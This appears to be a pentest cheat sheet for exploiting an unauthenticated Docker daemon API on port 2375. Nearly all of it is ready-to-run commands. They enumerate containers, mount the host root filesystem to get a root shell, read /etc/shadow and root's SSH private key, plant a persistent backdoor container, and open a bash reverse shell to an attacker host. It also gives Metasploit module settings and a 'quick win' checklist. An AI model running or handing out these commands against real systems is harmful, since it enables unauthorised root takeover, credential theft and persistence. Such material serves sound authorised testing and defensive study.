# DOCKER API ENUMERATION (Port 2375)

## SERVICE OVERVIEW
```
Docker API - Remote Docker management
- Default port: 2375 (HTTP) / 2376 (HTTPS)
- NO AUTHENTICATION BY DEFAULT!
- Full container control = often root on host!
- CRITICAL if exposed to network
```

## DETECTION
```bash
nmap -sV -p2375 <IP>
curl http://<IP>:2375/version
curl http://<IP>:2375/containers/json
```

## ENUMERATION
```bash
# Get Docker version
curl http://<IP>:2375/version

# List containers
curl http://<IP>:2375/containers/json

# List images
curl http://<IP>:2375/images/json

# Get system info
curl http://<IP>:2375/info
```

## EXPLOITATION (CONTAINER ESCAPE TO ROOT!)
```bash
# Method 1: Run privileged container with host filesystem mounted
docker -H tcp://<IP>:2375 run -it --rm --privileged -v /:/host alpine chroot /host /bin/bash
# YOU ARE NOW ROOT ON THE HOST!

# Method 2: Run container and execute commands on host
docker -H tcp://<IP>:2375 run -v /:/mnt --rm alpine cat /mnt/etc/shadow
docker -H tcp://<IP>:2375 run -v /:/mnt --rm alpine cat /mnt/root/.ssh/id_rsa

# Method 3: Create malicious container
docker -H tcp://<IP>:2375 run -d --restart=always -v /:/host alpine sh -c "while true; do echo backdoor; sleep 3600; done"

# Method 4: Reverse shell
docker -H tcp://<IP>:2375 run -v /:/host alpine chroot /host sh -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"
```

## CONTAINER IMAGE ANALYSIS
```bash
# Pull images from exposed registry
docker -H tcp://<IP>:2375 images
docker -H tcp://<IP>:2375 pull <image>
docker save <image> -o image.tar

# Analyze for secrets
tar -xvf image.tar
grep -r "password\|secret\|api" .
```

## METASPLOIT
```bash
use exploit/linux/http/docker_daemon_tcp
set RHOSTS <IP>
set RPORT 2375
set LHOST <attacker_IP>
exploit
```

## QUICK WIN CHECKLIST
```
☐ Check if port 2375 accessible
☐ Test curl http://<IP>:2375/version
☐ List containers and images
☐ Mount host filesystem in container
☐ Extract /etc/shadow, SSH keys
☐ Get root shell on host
☐ Analyze container images for secrets
```

## CRITICAL SEVERITY
```
Exposed Docker API = INSTANT ROOT!
- No authentication
- Full container control
- Can mount host filesystem
- Escape to root on host
- Extract all secrets/keys
- Critical finding!
```
